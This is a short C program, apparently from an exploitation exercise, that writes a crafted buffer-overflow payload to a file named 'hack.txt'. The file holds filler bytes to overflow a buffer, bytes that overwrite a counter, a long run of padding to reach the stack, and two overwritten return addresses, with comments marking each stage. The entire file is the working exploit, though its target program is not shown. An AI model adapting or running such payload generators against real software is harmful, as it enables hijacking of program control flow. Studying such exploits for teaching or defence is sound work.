#include <stdlib.h>
#include <stdio.h>
#include <assert.h>

static const char* FILE_NAME = "hack.txt";

int main()
{
    FILE* fp = fopen(FILE_NAME, "w");
    assert(fp);

    for (int i = 0; i < 16; i++)                // overflowing buffer
    {
        fputc('a', fp);
    }

    fputc(0xFF, fp);                            // filling counter
    fputc(0xFF, fp);
    fputc(0xFF, fp);
    fputc(0xFF, fp);
    fputc(0xFF, fp);

    for (int i = 0; i < 64715; i++)             // trying to reach stack
    {
        fputc('A', fp);
    }

    fputc(0x13, fp);                            // first return adress
    fputc(0x01, fp);

    fputc(0x06, fp);                            // second return adress
    fputc(0x01, fp);

    fputc('$', fp);                             // end of input

    fclose(fp);

    return 0;
}
